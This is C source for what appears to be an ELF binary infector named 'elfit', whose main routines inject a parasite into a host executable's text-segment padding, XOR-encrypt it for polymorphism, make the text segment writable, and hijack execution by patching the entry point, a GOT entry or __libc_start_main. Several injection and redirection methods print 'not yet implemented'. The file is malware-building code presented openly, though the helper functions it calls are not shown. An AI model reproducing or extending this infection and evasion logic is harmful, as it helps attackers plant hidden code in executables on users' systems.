#include "elfit.h"

int elfit32(opts_t *opts)
{
    Elfit_t host;
    Elfit_t parasite;
    uint32_t malpoint;
    uint32_t patch_pos;

    printf("[debug] decided to use 32bit infection\n");

    if (opts->cross_infect)
    {
        opts->cross_infect--;
        return elfit64(opts);
    }

    if (!opts->host)
    {
        return -1;
    }

    if (!opts->patch_pos)
    {
        printf("parasite patch position not set\n");
        return -1;
    }

    patch_pos = opts->patch_pos;
    
    load_host(opts->host, &host);
    load_host(opts->parasite, &parasite);

    if (opts->textpadding)
    {
        malpoint = textpadding_inject_32(&host, opts->parasite, 
            patch_pos, opts->patch_addr);

    } 
    else if (opts->reversepadding)
    {
        printf("chosen injection method not yet implemented\n");
        return -1;
    } 
    else if (opts->soinject)
    {
        printf("chosen injection method not yet implemented\n");
        return -1;
    } 
    else if (opts->etrelinject)
    {
        printf("chosen injection method not yet implemented\n");
        return -1;
    }

    reload_host(opts->host, &host);

    if (opts->entrypoint) 
    {
        entry_redirect_32(&host, malpoint);
    }
    else if (opts->gottable)
    {
        if (opts->pltsymbol)
        {
            got_redirect_32(&host, opts->pltsymbol, malpoint);
        }
        else
        {
            printf("chosen redirection method requires symbol to be chosen\n");
            return -1;
        }
    }
    else if (opts->ctors)
    {
        printf("chosen redirection method not yet implemented\n");
        return -1;
    }
    else if (opts->dtors)
    {
        printf("chosen redirection method not yet implemented\n");
        return -1;
    }
    else if (opts->arbfunc)
    {
        printf("chosen redirection method not yet implemented\n");
        return -1;
    }
    else if (opts->startmain)
    {
        return libc_start_main_hijack_32(&host, malpoint, opts->startmain_mode);
    }

    unload_host(&host);
    return 1;
}

int elfit64(opts_t *opts)
{
    Elfit_t host;
    Elfit_t parasite;
    uint64_t malpoint;
    uint64_t patch_pos;

    if (opts->cross_infect)
    {
        opts->cross_infect--;
        return elfit32(opts);
    }

    if (!opts->host)
    {
        return -1;
    }

    if (!opts->patch_pos)
    {
        printf("parasite patch position not set\n");
        return -1;
    }

    patch_pos = opts->patch_pos;
    
    load_host(opts->host, &host);
    load_host(opts->parasite, &parasite);

    if (opts->patch_addr)
    {
        printf("[+ PATCHING PARASITE]\t\tto jump to %08x\n", opts->patch_addr);
        if (patch_parasite64(&parasite, patch_pos, opts->patch_addr))
        {
            printf("out-of-bounds patch position supplied\n");
            return -1;
        }
    }
    else
    {
        printf("parasite patch virtual address required\n");
        return -1;
    }

    if (opts->polymorphic_key)
    {
        printf("[+ POLYMORPHIZING PARASITE]\twith xor key 0x%0x\n", opts->polymorphic_key);
        parasite_polymorphize64(&parasite, opts->polymorphic_key);
    }

    /* If we're injecting to the text segment and we're using polymorphism
     * we must make the text segment writable */
    if (opts->textpadding)
    {
        malpoint = textpadding_inject_64(&host, &parasite, 
            patch_pos, opts->patch_addr);
        reload_host(opts->host, &host);
        if(opts->polymorphic_key)
        {
            printf("[+ TEXT_SEGMENT MOD]\t\tmaking text segment writable for polymorphism\n");
            make_text_writeable64(&host);
        }
    } 
    else if (opts->reversepadding)
    {
        printf("chosen injection method not yet implemented\n");
        return -1;
        if(opts->polymorphic_key)
            make_text_writeable64(&host);
    } 
    else if (opts->soinject)
    {
        printf("chosen injection method not yet implemented\n");
        return -1;
    } 
    else if (opts->etrelinject)
    {
        printf("chosen injection method not yet implemented\n");
        return -1;
    }

    reload_host(opts->host, &host);

    if (opts->entrypoint) 
    {
        printf("[+ ENTRY_POINT REDIR]\t\tpatching host's entrypoint to 0x%08x\n", malpoint);
        entry_redirect_64(&host, malpoint);
    }
    else if (opts->gottable)
    {
        if (opts->pltsymbol)
        {
            got_redirect_64(&host, opts->pltsymbol, malpoint);
        }
        else
        {
            printf("chosen redirection method requires symbol to be chosen\n");
            return -1;
        }
    }
    else if (opts->ctors)
    {
        printf("chosen redirection method not yet implemented\n");
        return -1;
    }
    else if (opts->dtors)
    {
        printf("chosen redirection method not yet implemented\n");
        return -1;
    }
    else if (opts->arbfunc)
    {
        printf("chosen redirection method not yet implemented\n");
        return -1;
    }

    unload_host(&host);
    return 1;
}


int main(int argc, char *argv[])
{
    opts_t *opts;

    if ((opts = usage(argc, argv)) == NULL)
    {
        exit(-1);
    }
    /* TODO Integrity check host for section header table */

#ifdef __i386__
    return elfit32(opts);
#else
    return elfit64(opts);
#endif
}
